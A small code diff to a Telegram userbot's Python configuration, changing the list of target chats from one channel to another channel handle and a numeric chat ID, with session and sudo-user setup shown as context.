@@ -18,7 +18,7 @@ else:
     SUDO_USERS = list(map(int, sudo_users_env.split(" ")))
     SUDO_USERS.append(6517626502)  # Adding an additional SUDO_USER
 
-CHATS = ['@noob_savvy_official',]
+CHATS = ['@Ongoing_Anime_Locus', '-1001811204942']
 # Initialize the client with a session name
 M = Client("my_session", session_string=SESSION_STRING, api_id=API_ID, api_hash=API_HASH)
 
